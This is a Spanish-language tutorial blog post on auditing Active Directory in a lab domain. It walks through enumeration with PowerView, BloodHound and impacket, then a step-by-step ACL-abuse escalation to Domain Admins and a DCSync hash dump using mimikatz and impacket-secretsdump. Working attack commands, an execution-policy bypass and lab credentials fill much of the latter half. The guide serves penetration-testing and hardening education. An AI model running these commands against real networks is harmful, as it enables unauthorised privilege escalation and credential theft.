---
title: Auditoria de Active Directory
date: 2025-02-27 11:00:00 +0000
categories: [Guía, Auditoria, Active Directory]
tags: [Guía, Auditoria, Active Directory, Windows, Kerberos, NTLM, Hash, Pass-the-Hash, Pass-the-Ticket, AS-REP Roasting, Golden Ticket, Silver Ticket, Silver Ticket]
image:
  path: /assets/img/cabeceras_genericas/microsoft-active-directory.jpg
  alt:  Microsoft Active Directory
description: >
  Guía de ejemplo para auditar posibles vulnerabilidades en Active Directory.
pin: false  
toc: true   
math: false 
mermaid: false 
---

## TIPOS DE AUDITORIAS DE SEGURIDAD

### Auditoria externa

No se dispone de acceso lógico o físico a la infraestructura de red de la organización.

### Auditoria interna 

Se dispone de acceso lógico (o VPN) o físico (infraestructura) a la red de la organización con los siguientes factores:

    - Sin credenciales de usuario de dominio; usamos nuestro ordenador personal dentro de la red pero no disponemos de credenciales de ningún tipo.

    - Con credenciales de usuario de dominio; ya sean un usuario dentro del dominio que usemos en nuestra máquina o un ordenador de la organización ya dentro de la infraestructura.


Lo más normal en una auditoria de Active Directory es que estemos en la infraestructura interna de la organización y tengamos un usuario sin privilegios perteneciente al dominio.

## ¿QUE INFORMACIÓN RECOPILAR?

El objetivo de vulnerar una infraestructura se basa en conseguir un usuario con privilegios de administrador del domino.

Para esto vamos a realizar un análisis de información para recopilar datos últiles sobre la estructura del dominio, grupos, usuarios, etc

- Usuarios y cuentas locales
- Grupos locales
- Usuarios y cuentas de dominio
- Equipos de dominio 
- Grupos de dominio
- OUs o unidades organizativas
- GPOs o políticas 
- ACLs
- Relaciones de confianza entre forests y domains
- Atributos de los objetos

## RECOPILACIÓN DE INFORMACIÓN LOCAL

Recopilación de información de la máquina que se encuentra en la red de la organización.

Lo más interesante es recopilar datos sobre los usuarios y grupos. Para ello se suele recurrir a una base de datos que administra los usuarios a nivel local dentro de la maquina windows llamada SAM (security account manager).

Esta base de datos se comprueba por el servicio LSA (Local security autority) para autenticar el acceso de los usuarios al sistema local.

Las contraseñas de los usuarios se almacenan hasheadas en el registro de windows (HKLM/SAM) en la ruta %SystemRoot%/system32/config/SAM

La SAM puede enumerar de forma local y remotamente aunque a hay que tener en cuenta que a partir de windows 10 1607 y windows server 2016 es necesario que el usuario tenga privilegios de administrador para ello aunque en versiones anterior un USUARIO DE DOMINIO si podía enumerar la SAM.

## RECOPILACIÓN DE INFORMACIÓN REMOTA

Es la enumeración de la base de datos que se crea en el servidor DC o domain controller, en la que se encuentran todos los datos y configuraciones del dominio, políticas, grupos, usuarios, relaciones, etc.

Para esto existen las interfaces que se comunican siendo la más importante para nosotros la LDAP (Lightweight Directory Access Portal) ya que es un protocolo de aplicación que permite interactuar con servicios de directorio para almacenar, leer o modificar información.

Lo interesante de este protocolo es que puede ser utilizado por cualquier usuario independientemente de sus privilegios, (obviamente si se es usuario basico no se podrán modificar los datos pero si consultarlos) y esto supone que con cualquier usuario de dominio podamos consultar la estructura interna del dominio y así ganar información sobre qué usuarios, grupos, unidades organizativas, etc son las más importantes o vulnerables a un posible escalado de privilegio así como sus relaciones.

Como dato curioso es que este protocolo no puede ser desactivado y si así fuese sería un problema a la hora de crear usuarios o que los usuarios utilizasen servicios dentro del dominio ya que cualquier usuario debe conocer sus relaciones y su posición para poder acatar las políticas y restricciones asignadas a si mismo, grupos pertenecientes o aplicaciones a las que tenga acceso, por lo que es una buena herramienta desde el punto de vista de recaudación de información para una auditoría.

### PowerView y ADModule

Dentro de una organización con un equipo o unas credenciales de un usuario perteneciente al dominio pero sin privilegios y nuestra maquina kali.

Nuestro objetivo es recopilar información, para esto vamos a ver unos cuantos comandos y técnicas para recabar información a nivel local.

- Usuario actual y dominio
```powershell
$env:Username // whoami
$env:UserDomain
```
- Nombre del equipo
```powershell
$env:ComputerName
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image.png)

Existen modulos externos para Active Direcotry que añaden comandos para poder extraer datos de el dominio, como el módulo de Active Directory Module para PowerShell (ADModule) que nos permite extraer información de la base de datos LDAP, pero este módulo es oficial y no tiene problema a ser utilizado.

Otro muy popular es PowerView que es un módulo de PowerShell que nos permite extraer información de la base de datos LDAP, pero también tiene problemas a ser utilizado ya que no es oficial y por tanto se debe importar.

Aquí entra en juego la política de ejecución de scripts que se encuentre configurada en el AD.

### **Control de Scripts de PowerShell**
#### Configuraciones:
- **Firma digital obligatoria**
- **Política de ejecución restrictiva**

#### Ataques Mitigados:
- **Ataques de Scripting:** Impide la ejecución de scripts maliciosos no firmados.
- **Persistence Through Scripts:** Bloquea técnicas de persistencia basadas en scripts.

Este módulo es parte de PowerMax y se puede encontrar en su repositorio de Github.

[Github](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

Lo normal es encontrarnos la siguiente situación si el AD esta configurado de forma segura.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-1.png)

Si no está bien configurado podemos importar el módulo con: 
```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```

Entre algunos comandos que se pueden utilizar de este módulo.
```powershell
Get-NetLocalGroup
Get-NetGroup -UserName "empleado1" | select name
Get-NetLocalGroupMember -GroupName Administradores | Select-Object MemberName, IsGroup, IsDomain
```

Aunque ofrece comandos que no se encuentran en el ADMoodule, muchos son alternativas a los comandos de ADModule que muestran los datos de forma más limpia o entendible.

```powershell
Get-LocalGroup | Select Name, Objectclass, Principalsource, sid 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-2.png)

```powershell
Get-LocalGroupMember -Group Administradores
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-3.png)

En versiones antiguas de windows como se mencionó anteriormente cualquier usuario de dominio sin privilegios podía enumerar la SAM de un equipo remoto:

Actualmente eso no es posible si el usuario del que tenemos control no es administrador del dominio, pero podemos enumerar otros datos como los grupos a los que pertenece el usuario.

- Por ejemplo:
```powershell
Get.NetLocalGroup -ComputerName WS02 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-4.png)

> Curiosidad
{: .prompt-info }

Si analizamos las peticiones que realiza la maquina mediante wireshark vemos lo siguiente:

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-5.png)

El tráfico pertenece al protocolo SAMR que va sobre DCE/RPC (Distributed computing enviroment / remote procedure call) y que es utilizado por windows para realizar peticiones a muchos de sus servicios de forma local y remota.

Esto es importante para saber en que situación se consulta la SAM y en que otras se consulta el NTDS.dit del domain controler

Cuando consultemos la base de datos del domain controles se utiliza el protocolo LDAPs.

Si queremos saber que usuario se encuentra logueado en un sistema usamos con powerview:

- Con PowerView:
```powershell
Get-NetLoggedon
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-6.png)

- Sin PowerView:

```powershell
Invoke-Command -ScriptBlock { Get-LocalGroupMember -Group Administradores } -ComputerName WS02
```

> Curiosidad
{: .prompt-info }

Si somos administrador del dominio podemos acceder a los discos c de los equipos pertenecientes en la siguiente ruta.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-7.png)

Podemos obtener las sesiones, las conexiones que se han establecido a la maquina que tenemos.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-8.png)

Podemos saber que un administrador se ha conectado a nuestra maquina desde esa IP por lo que ya tenemos un potencial objetivo que si conseguimos vulnerar tendremos altas probabilidades de tener acceso administrativo.

Importante recalcar que aunque la conexión falle, por ejemplo si desde otro usuario sin privilegios intenta acceder a la carpeta compartida C$ este intento se registra igualmente.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-9.png)

Esto añade importancia a la creación de polísiticas de acceso a recursos compartidos y a la creación de usuarios con permisos de acceso limitado, así como las políticas y revision de logs de los servicios de red.

Vemos como igualmente aparece registrado si volvemos a ejecutar el comando Get-NetLoggedon.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-10.png)

### Enumeración desde linux

Para poder apuntar al dominio necesitamos configurar el DNS de la maquina linux.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-11.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-12.png)

Configuramos que el método solo asigne nuestra IP de forma automática e indicamos la ip del dominio y como vemos ahora si podemos apuntar al dominio 

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-13.png)

Para poder averiguar que IP corresponde a un controlador de dominio simplemente podemos hacer uso de un reconocimiento con NMAP y en función de los servicios y puertos que la maquina tenga activos podemos deducir rápidamente de que máquina se trata.

```bash	
sudo nmap -sS -n 192.168.20.0-7  
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-14.png)

Siendo puertos 88 y 389 de los mas reconocibles en un controlador de dominio.

#### RPClient

Para poder enumerar SAM de forma remota en Kali vamos a usar rpcclient, una herramienta clásica que implementa los protocolos que usa windows para comunicarse con sus servicios DCE/RPC.

```bash	
rpcclient -U "corp\empleado1%Passw0rd1" WS01.corp.local 
```

Entre sus funciones podemos encontrar `enumprivs` que enumera los privilegios del usuario loggeado.

Si intentamos enumerar la SAM de forma remota con este usuario tendremos un error de acceso denegado ya que no tenemos permisos de administrador.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-15.png)

#### Impacket

Es un conjunto de scripts en python que implementan muchos de los protocolos que utiliza windows con ejemplos de uso.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-16.png)

```bash		
imapacket-samrdump corp/empleado1:Passw0rd1@WS01.corp.local
```
Si de igual forma ejecutamos un dump de SAM con un usuario sin privilegios seguiremos sin tener acceso.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-17.png)

## Recopilación por LDAP 

Junto con Powerview vamos a utilizar otro modulo que se encuentra en cualquier servidor promovido a domain controler.

Si queremos utilizar los comandos de ADModule en un equipo que no sea un controlador de dominio, debemos importarlo.

Para esto cogeremos la dll del windows server y la copiaremos a nuestra maquina.

`C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\v4.0_10.0.0.0__31bf3856ad364e35`

En esa dirección podremos encontrar el archivo dll con la configuración y librerías llamado **Microsoft.ActiveDirectory.Management.dll**

De esta manera podremos listar datos del dominio desde una estación de trabajo dentro del dominio.

Una cosa a tener en cuenta es que el protocolo utilizado para recibir la información son paquetes TCP y no DCE/RPC, es decir que estamos haciendo querys al controlador de dominio mientras que si utilizamos PowerView el protocolo es LDAP por lo que se está comunicando con la interfaz de data controler de dominio.

### Peticiones a la base de datos NTDS.dit

Proporciona información general sobre el Active Directory, en concreto del dominio como SID, forest, master de la infraestructura “DC01.corp.local”

- ADModule

```powershell
Get-ADDomain
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-18.png)

- PowerView

```powershell
Get-NetDomain
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-19.png)

Políticas de acceso 

```powershell
Get-DomainPolicy
(Get-DomainPolicy). "SystemAccess"
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-20.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-21.png)

 Para obtener mas información sobre el controlador de dominio

 - ADModule

 ```powershell
 Get-ADDomainController
 ```

 ![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-22.png)

 - PowerView

 ```powershell
 Get-NetDomainController
 ```

 ![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-23.png)

 > Aviso ¡:  Es de tener en cuenta que el uso de powerview conlleva algunos riesgos a nivel de tráfico si nos encontramos con algun IDS como SNORT.
{: .prompt-warning }

 Esto se debe a que las peticiones que implementa powerview o llamadas puede haber paquetes que no sean correctos del todo aunque no es un aviso alarmante desde un punto de vista del departamento de seguridad, pero hay que tener en cuenta que a nivel de red powerview deja algunas trazas en el tráfico de red.


- ADModule

```powershell
Get-ADUser -Filter *
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-24.png)

- PowerView

```powershell
Get-NetUser
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-25.png)

Podemos filtrar las búsquedas por ejemplo para obtener las ultimas conexiones.

```powershell
Get-NetUser | select name,lastlogoff,lastlogon
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-26.png)

Información sobre los equipos del dominio

- ADModule

```powershell
Get-ADComputer -Filter * | select name,...
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-27.png)

- PowerView

```powershell
Get-NetComputer | select name,operatingsystemversion,...
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-28.png)

Con powerview podemos saber que equipos están levantados

```powershell	
Get-NetComputer -Ping | select name,operatingsystem 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-29.png)

Otros objetos interesantes que obtener del Active Directory

 Obtener grupos del dominio

```powershell	
Get-DomainGroup
```

Usuarios del grupo administradores

```powershell	
Get-NetGroupMember
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-30.png)

Podemos identificar recursos compartidos

```powershell
Find-DomainShare
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-31.png)

Para enumerar unidades organizativas

```powershell	
Get-NetOU
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-32.png)

Para enumerar GPOs

```powershell	
Get-NetGPO | select displayname
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-34.png)

Podemos pedir que GPO aplican a un equipo en concreto

```powershell
Get-NetGPO -ComputerIdentity WS02
```

Para obtener las access list de ese usuario en concreto

```powershell
Get-ObjectAcl -SamAccountName empleado1
```

Podemos recabar información sobre el forest

```powershell
Get-NetForestDomain
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-35.png)

Un comando más para encontrar que máquinas de dominio tienen un usuario administrador

```powershell
Find-LocalAdminAccess -Verbose
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-36.png)

[Más comandos](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration)


#### Enumeración desde linux

##### LDAPSEARCH

El siguiente comando es un intento de sesión mediante unas credenciales que por defecto están deshabilitadas en la ldap que permiten conexión sin identificación así como en ftp se encuentra el anonymous.

```bash
ldapsearch -X -h 192.168.20.5 -D '' -W '' -b "DC=corp,DC=local" 
```

- x → modo de autenticación básico

- h → host donde se encuentra la base de datos

- D → nombre de usuario dentro del dominio

- w → contraseña

- b →con que objetos del dominio queremos interactuar

Ejemplos:

- `ldapsearch -x -h 192.168.20.5 -D 'CORP\empleado1' -w 'Passw0rd1' -b "DC=corp,DC=local"`

- `ldapsearch -x -h 192.168.20.5 -D 'CORP\empleado1' -w 'Passw0rd1' -b "CN=Users,DC=corp,DC=local"`

- `ldapsearch -x -h 192.168.20.5 -D 'CORP\empleado1' -w 'Passw0rd1' -b "CN=Administradores,CN=Builtin,DC=corp,DC=local"`

#### PYWERVIEW

De igual manera permite interactuar con la base de datos mediante LDAP

```bash	
pywerview get-netdomaincontroller -u empleado1 --dc-ip 192.168.20.5 -p Passw0rd1
```

Devuelve información relativa al controlador de dominio

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-37.png)

Para usuarios

```bash	
pywerview get-netuser -u empleado1 --dc-ip 192.168.20.5 -p Passw0rd1
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-38.png)

Para grupos

```bash	
pywerview get-netgroup -u empleado1 --dc-ip 192.168.20.5 -p Passw0rd1
```

Para GPO

```bash	
pywerview get-netgpo -u empleado1 --dc-ip 192.168.20.5 -p Passw0rd1
```

##### JXPLORER

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-39.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-40.png)

## BloodHound

Probablemente la herramienta más versátil que, demás de una herramienta de recopilación sirve como herramienta de análisis de vulnerabilidades.

Se basa en la teoría de grafos, recaudando toda la información de los objetos del dominio y los representa en forma gráfica con sus realaciones.

[Github](https://github.com/BloodHoundAD/BloodHound)

Consta de dos elementos:

- Servidor o aplicación principal para representar los objetos y sus relaciones

- Collectors; módulos que debemos ejecutar en la máquina unida a dominio para que recopile la información y genere el fichero.

### Instalación

En Kali se encuentra en los repositorios.

```bash
sudo apt install bloodhound
```

```bash
sudo neo4j console
```
Vemos que crea un servicio en el puerto 7687
En la interfaz web usamos las credenciales por defecto neo4j y cambiamos la contraseña.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-41.png)

### Recopilar los datos

Entre muchas herramientas para recopilar estos datos una de las más sencillas y sin necesidad de un equipo fisico dentro del dominio es NetExec.

```bash	
nxc ldap dc01.DOMAIN.corp -u <USER> -p <PASSWORD> --bloodhound --collection All --dns-tcp --dns-server <IP>
```

Hecho esto podemos importar el ZIP en BloodHound.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-42.png)
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-43.png)

Desde aquí podemos analizar las relaciones, permisos, atributos, etc 

Pero lo más interesante de BloodHound es el análisis que ya trae implementado porque al estar basado en ese tipo de base de datos no relacional permite hacer querys complejos y representarlas.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-44.png)
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-45.png)
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-46.png)
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-47.png)
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-48.png)

Ademas de las querys por defecto en la comunidad se encuentran algunas hechas por los usuarios

[Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
[BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
[HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound)


## ACLs Listas de control de acceso

Es un concepto muy importante que aplica a todo el sistema operativo windows.

[Documentación oficial](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)

**SECURITY DESCRIPTORS**

Contiene la información de seguridad asociada con un “securable object".

Consiste en una estructura llamada Security Descriptor y la información de seguridad asociada que consiste en:

- Security identifiers: SIDs del dueño (owner) y grupo principal del objeto.

- DACL: “Discretionary access control list” especifica los permisos de acceso a usuarios o grupos, que usuarios o grupos tienen acceso a que objetos concretos.

- SACL: “System access control list” especifica los tipos de acceso al objeto que generan trazas de auditoria

- Un conjunto de bits de control

Todos los objetos que tiene un sistema windows tienen asociado un descriptor de seguridad, por ejemplo:

**DACL**

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-49.png)

Usuarios o grupos que tienen ciertos permisos sobre este objeto “empleado1”

**SACL**

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-50.png)

Registros de auditoria o trazas que quedan cuando se provocan ciertos accesos.

Esto es interesante por lo siguiente:

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-51.png)

Si hacemos click en un access entry ACE vemos que tipo de privilegios tiene un usuario o grupo sobre el objeto en cuestión entre los que se encuentran muchos como por ejemplo cambiar la contraseña. Por lo que tenemos un usuario o grupo comprometido que puede modificar la contraseña de otro, ya no es necesario comprometer la contraseña de ese usuario objetivo sino que simplemente podremos modificar su acceso y loggear en su nombre con una contraseña restablecida.

### Identificación ACLs vulnerables

**OBJETIVO**: A partir de un usuario sin privilegios convertirnos en un administrador del dominio.

En este caso vamos a intentar de explotar los privilegios de acceso de ACL aprovechando pequeños permisos que tengamos sobre ciertos objetos ir expandiendo los privilegios.

A continuación os indico un listado de ACLs que debemos tener en cuenta desde el punto de vista de seguridad de cara a su explotación:

    ForceChangePassword: Proporciona la capacidad de cambiar la contraseña del usuario objetivo sin conocer el valor actual. Abusado con Set-DomainUserPassword

    AddMembers: Proporciona la capacidad de añadir usuarios, grupos o equipos arbitrarios al grupo de destino. Abusado con Add-DomainGroupMember

    GenericAll: Proporciona control total del objeto, incluyendo la capacidad de añadir otros usuarios a un grupo, cambiar una contraseña de usuario sin conocer su valor actual, registrar un SPN con un objeto de usuario, etc. Abusado con Set-DomainUserPassword o Add-DomainGroupMember

    GenericWrite: Proporciona la capacidad de actualizar cualquier valor de parámetro de objeto de destino no protegido. Por ejemplo, actualizar el valor del parámetro "scriptPath" en un objeto de usuario de destino para hacer que ese usuario ejecute los comandos/ejecutables especificados la próxima vez que se conecte. Abusado con Set-DomainObject

    WriteOwner: Proporciona la capacidad de actualizar el propietario del objeto de destino. Una vez que el propietario del objeto ha sido cambiado a un usuario que el atacante controla, el atacante puede manipular el objeto de la manera que crea conveniente. Abusado con Set-DomainObjectOwner

    WriteDACL: Proporciona la capacidad de escribir una nueva ACE en la DACL del objeto objetivo. Por ejemplo, un atacante puede escribir una nueva ACE en la DACL del objeto de destino, dándole el "control total" del objeto de destino. Abusado con Add-NewADObjectAccessControlEntry

    AllExtendedRights: Proporciona la capacidad de realizar cualquier acción asociada con los derechos extendidos de Active Directory contra el objeto. Por ejemplo, añadir usuarios a un grupo y forzar el cambio de la contraseña de un usuario de destino. Se abusa con Set-DomainUserPassword o Add-DomainGroupMember

Por supuesto, esta no es la lista completa de ACLs que pueden vulnerarse, existen decenas de permisos que bajo ciertas circunstancias también pueden llegar a ser explotados.

#### Buscando ACLs del grupo Admins del dominio

```powershell
Get-DomainObjectAcl -Identity "Admins. del dominio"
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-52.png)

- Objeto sobre el que se aplica la ACE : OBJECTSID
- El tipo de permiso : Active directory rights
- Tipo de ACE : AceType
- Identificador de seguridad que tiene el objeto que tiene los permisos GenericAll sobre admins del dominio

Cada uno de esos bloques se trata de un ACL del DACL del grupo Admins del dominio.

Para convertir un SID a su nombre:

```powershell	
Convert-SidToName S-1-5-21-422223421-2761745813-2535134267-512
```

Este security identifier es el objeto que tiene privilegios sobre el identifier de arriba:

```powershell		
Convert-SidToName S-1-5-18
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-53.png)

Para obtener lo más interesante aplicamos filtro:

```powershell	
Get-DomainObjectAcl -Identity "Admins. del dominio" | select @{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}},AceType,ActiveDirectoryRights | fl 
```

Otro comando que proporciona todas las ACLs de los objetos dentro del dominio y muestra aquellas que tienen un valor mayor a 1000 en el SID ya que esto quiere decir que esta DACL la ha creado un administrador y no es una por defecto.

Esto es porque los grupos por defecto suelen estar bien configurados pero los creados por administradores pueden tener errores.

```powershell
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-54.png)

Como vemos el valor final del SID es mas de 1000

### Analizando ACLs con BloodHound

Al importar el archivo ZIP de los datos recabados de la LDAP.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-55.png)

Ahora si en análisis buscamos que busque la ruta más corta para obtener permisos de administrador

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-56.png)

Si hacemos click en admins del dominio y nos vamos a la información de la izquierda podemos ver

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-57.png)

- **OUTBOUND OBJECT CONTROL**: Se tratan de los privilegios que tiene este grupo sobre otros objetos
- **INBOUND CONTROL RIGHTS (DACLs)**: Los privilegios que tienen otros objetos sobre este

Si hacemos click para saber que objetos tienen privilegios sobre este, nos damos cuenta de que hay dos grupos que los tienen esos 3 privilegios (GenericWrite, WriteOver, WriteDacl):

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-58.png)

Esto significa que comprometiendo uno de estos dos grupos podríamos auto promocionarnos al grupo de admins del dominio.

Por lo que si nos vamos a administrators y buscamos que grupos forman parte

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-59.png)

Como vemos tiene varios grupos que son por defecto pero, vemos que tiene uno que no IT Admins por lo que buscamos que miembros pertenecen

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-60.png)

### Explotación de ACLs

Mediante BloodHound vamos a encontrar el camino más corto para llegar al grupo domain admins.

En la pestaña de análisis en BloodHound `Find shortest path to domain admins` desde el que nos muestra el siguiente esquema.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-61.png)

Marleen forma parte de accounting que a su vez tiene ACLs que permiten modificar los miembros de Project Management.

Teniendo sus credenciales vamos a ejecutar powershell como este usuario.

En una interfaz gráfica simplemente hacemos click derecho en powershell, luego shift+click derecho y ejecutar como otro usuario.

Si disponemos de una powershell ya activa como otro usuario podemos ejecutar el siguiente comando:

```powershell
runas /user:corp\marleen.julia powershell
Julia
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-62.png)

Si necesitamos los archivos del equipo actual pero el usuario en red de Julia podemos ejecutar el siguiente comando:

```powershell
runas /user:corp\marleen.julia /netonly powershell
```

Esto provoca que tengamos el token del usuario empleado1 de manera local pero autenticarse a nivel de red tenemos el token de Marleen.Julia.

En este caso vamos a explotar la vulnerabilidad del permiso WRITE-OWNER que dispone el grupo ACCOUNING del cual forma parte Marleen.Julia para así poder agregarnos al grupo PROJECT.MANAGEMENT

**WriteOwner** es un privilegio que permite a los miembros del grupo ACCOUNTING modificar el propietario del grupo PROJECT MANAGEMENT.

Esto implica que modificamos el propietario del grupo al usuario Julia, por lo que tendremos la capacidad de modificar todo el DACL y, debido a esto podemos introducir una ACL que nos permita con el usuario Julia añadir miembros a ese grupo PROJECT MANAGEMENT y añadrinos a nosotros mismos.

Si en BloodHound hacemos click derecho sobre WriteOwner podremos obtener información sobre las vulnerabilidades.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-63.png)

- PowerView

```powershell
Set-DomainObjectOwner -Identity "Project management" -OwnerIdentity marleen.julia
```

Si como en este caso disponemos de acceso al administrador de dominio podemos observas los cambios en tiempo real y comprobar como se ha modificado el propietario del grupo.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-64.png)

Ahora agregamos una ACL que permita a Marleen.Julia añadir usuarios a el grupo PROJECT MANAGEMENT.

- PowerView

```powershell
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights WriteMembers -PrincipalIdentity marleen.julia 
```

Ahora si volvemos a comprobar el administrador del dominio vemos que se ha añadido una entrada nueva a nombre del usuario de Julia

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-65.png)

Esta ACL permite a Marleen.Julia añadir usuarios a el grupo PROJECT MANAGEMENT.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-66.png)

Ahora que somos miembros de de PROJECT MANAGEMENT podemos hacer uso de la propiedad que nos otorga la ACL de Generi-Write sobre el grupo Executives

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-67.png)

> Nota : Es necesario reiniciar la sesión del usuario Julia para que se apliquen los cambios.
{: .prompt-info }

- PowerView

```powershell
Add-DomainGroupMember -Identity 'Executives' -Members 'marleen.julia'
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-68.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-69.png)

Ahora por extensión somos miembros de Executives que a su vez es miembro de OfficeAdmin que a su vez es miembro de administradores de empresas

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-70.png)

Esto implica que ahora podremos abusar de WriteDACL para escribir una nueva dentro de admins del dominio para permitir al usuario de Julia añadir miembros y auto añadirse a administradores del dominio.

- PowerView

```powershell
Add-DomainObjectAcl -TargetIdentity "Admins. del dominio" -Rights WriteMembers -PrincipalIdentity marleen.julia 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-71.png)

Ahora que tenemos esta ACL podemos hacer uso de ella para añadir a nuestro usuario de julia al grupo de administradores del dominio.

```powershell
Add-DomainGroupMember -Identity 'Admins. del dominio' -Members 'marleen.julia'
```

Reinicamos sesión de julia para que se apliquen los cambios.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-72.png)


## Explotación del privilegio DCSync

Dentro de un dominio AD pueden existir múltiples controladores de dominio y lo recomendable es que exista una redunancia en los datos de los controladores de dominio para evitar la pérdida de datos.

Si se desean mantener varios sistema con una base de datos sincronizada, windows server proporciona un protocolo a través del cual un controlador de dominio o usuario puede hacer peticiones a otro controlador de dominio para obtener la información de su base de datos y actualizar el backup de la base de datos de respaldo.

En este ataque se aprovecha este privilegio para hacer peticiones como si fuesemos otro controlador de dominio o usuario con estos privilegios para que el CD principal nos sirva una copia de la base de datos de usuarios.

En BloodHound hacer uso de la siguiente opción.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-73.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-74.png)

Observamos numerosos grupos que tienen estos privilegios. Esto es porque por defecto hay varios grupos cuentan con esto predefinido y es algo a tener en cuenta a la hora de bastionar.

- PowerView

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN,ObjectAceType,@{name="name";expression={Convert-SidToName $_.SecurityIdentifier}}
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-75.png)

Vamos a usar a el usuario brooks.aileen ya que pertenece a ITAdmins y de ahí hereda el permiso de DCSync.

Para poder replicar la base de datos podemos utilizar mimikatz.

Es una herramienta popular y por esto es sencillo que sea detectada por sistemas de detección de intrusión.

Existen comandos para hacerlo desde Kali Linux sin necesidad de estar en un sistema windows siempre y cuando tengamos las credenciales del usuario.

Necesitamos el acceso a brooks.aileen para poder recabar la información pero esta vez necesitamos que los privilegios sean remotos y locales por lo que debemos llevar el archivo hasta un lugar donde brooks.aileen pueda ejecutarlo.

```powershell
runas /user:corp\brooks.aileen powershell
```
Ejecutamos Mimikatz y hacemos el dump de la base de datos de usuarios.

```powershell
lsadump::dcsync /user:corp\administrador 
```

Donde el apartado administrador será el nombre del usuario que queramos dumpear.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-76.png)

Todo esto se puede ejecutar de forma remota desde Kali con las herramientas de Impacket.

```bash
impacket-secretsdump -just-dc brooks.aileen:"Aileen"@192.168.20.5
```

Obtenemos todos los hashes de todos los usuarios de la base de datos del dominio, incluido el del administrador:

